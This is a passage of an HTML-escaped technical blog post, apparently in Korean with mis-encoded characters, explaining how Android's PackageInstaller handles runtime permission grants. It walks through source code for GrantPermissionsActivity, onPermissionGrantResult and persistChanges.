    &lt;span class=&quot;n&quot;&gt;mViewHandler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GrantPermissionsAutoViewHandler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mCallingPackage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userHandle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setResultListener&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mViewHandler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;android&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;packageinstaller&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;permission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ui&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;handheld&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;GrantPermissionsViewHandlerImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mCallingPackage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userHandle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setResultListener&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì˜ ì½”ë“œì—ì„œ ë³´ì´ë“¯, GrantPermissionActivityë¥¼ í˜¸ì¶œí•œ íŒ¨í‚¤ì§€ì˜ ì •ë³´ë¥¼ ì°¾ì•„ uidë¥¼ ê°€ì ¸ì˜¨ ì´í›„, ê¸°ê¸°ì˜ ì¢…ë¥˜ì— ë”°ë¼ì„œ ìš”ì²­í•˜ëŠ” í•¸ë“¤ëŸ¬ê°€ ë‹¬ë¼ì§€ê²Œ ë©ë‹ˆë‹¤. ì´í›„ì— í¼ë¯¸ì…˜ ë³„ ê·¸ë£¹í™”ë¥¼ ì§„í–‰í•œ ë’¤, ì‚¬ìš©ìì˜ í¼ë¯¸ì…˜ ìŠ¹ì¸ ì—¬ë¶€ì˜ ê²°ê³¼ë¥¼ ì²˜ë¦¬í•˜ê¸° ìœ„í•´ &lt;code class=&quot;highlighter-rouge&quot;&gt;onPermissionGrantResult&lt;/code&gt; ê°€ í˜¸ì¶œë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onPermissionGrantResult&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;nd&quot;&gt;@GrantPermissionsViewHandler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Result&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;logGrantPermissionActivityButtons&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;GroupState&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foregroundGroupState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getForegroundGroupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;GroupState&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;backgroundGroupState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getBackgroundGroupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;GRANTED_ALWAYS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foregroundGroupState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;onPermissionGrantResultSingleState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foregroundGroupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;backgroundGroupState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;onPermissionGrantResultSingleState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;backgroundGroupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;GRANTED_FOREGROUND_ONLY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foregroundGroupState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;onPermissionGrantResultSingleState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foregroundGroupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;backgroundGroupState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;onPermissionGrantResultSingleState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;backgroundGroupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;DENIED&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foregroundGroupState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;onPermissionGrantResultSingleState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foregroundGroupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;backgroundGroupState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;onPermissionGrantResultSingleState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;backgroundGroupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;DENIED_DO_NOT_ASK_AGAIN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foregroundGroupState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;onPermissionGrantResultSingleState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foregroundGroupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;backgroundGroupState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;onPermissionGrantResultSingleState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;backgroundGroupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;showNextPermissionGroupGrantRequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;setResultAndFinish&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì‚¬ìš©ìê°€ ì„ íƒí•œ ê²°ê³¼ì— ì˜í•´ ë¶„ê¸°ëœ ì´í›„, ìŠ¹ì¸ ë˜ëŠ” ê±°ë¶€í•œ í¼ë¯¸ì…˜ ê·¸ë£¹ì˜ ê²°ê³¼ë¥¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;onPermissionGrantResultSingleState&lt;/code&gt; í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ì²˜ë¦¬í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹í•˜ëŠ” í•¨ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onPermissionGrantResultSingleState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;GroupState&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;groupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;granted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;doNotAskAgain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;groupState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;groupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mGroup&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;groupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GroupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;STATE_UNKNOWN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;granted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;groupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mGroup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;grantRuntimePermissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;doNotAskAgain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;groupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;affectedPermissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;groupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GroupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;STATE_ALLOWED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;reportRequestResult&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;groupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;affectedPermissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;no&quot;&gt;PERMISSION_GRANT_REQUEST_RESULT_REPORTED__RESULT__USER_GRANTED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;groupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mGroup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;revokeRuntimePermissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;doNotAskAgain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;groupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;affectedPermissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;groupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mState&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GroupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;STATE_DENIED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;reportRequestResult&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;groupState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;affectedPermissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;doNotAskAgain&lt;/span&gt;
                    &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;
                    &lt;span class=&quot;no&quot;&gt;PERMISSION_GRANT_REQUEST_RESULT_REPORTED__RESULT__USER_DENIED_WITH_PREJUDICE&lt;/span&gt;
                    &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;PERMISSION_GRANT_REQUEST_RESULT_REPORTED__RESULT__USER_DENIED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìŠ¹ì¸ ë˜ëŠ” ê±°ë¶€í•œ í¼ë¯¸ì…˜ì„ ê°ê° RuntimePermissionì„ ì„¤ì •í•´ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ í•¨ìˆ˜ë¥¼  ë”°ë¼ê°€ê²Œ ë˜ë©´, ì´ì „ì— ì²˜ë¦¬í•œ í¼ë¯¸ì…˜ì¸ì§€ ë˜ëŠ” ì•±ì—ì„œ ì„¤ì •ëœ í¼ë¯¸ì…˜ì¸ì§€ ë“±ë“± ì—¬ëŸ¬ ì¡°ê±´ë“¤ì— ëŒ€í•´ ê²€ì‚¬ë¥¼ ì§„í–‰í•©ë‹ˆë‹¤. ëª¨ë“  ì¡°ê±´ì„ ê±°ì¹œ ì´í›„, &lt;code class=&quot;highlighter-rouge&quot;&gt;persistChanges&lt;/code&gt; í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê²Œ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;persistChanges&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mayKillBecauseOfAppOpsChange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mPackageInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;applicationInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numPermissions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mPermissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shouldKillApp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

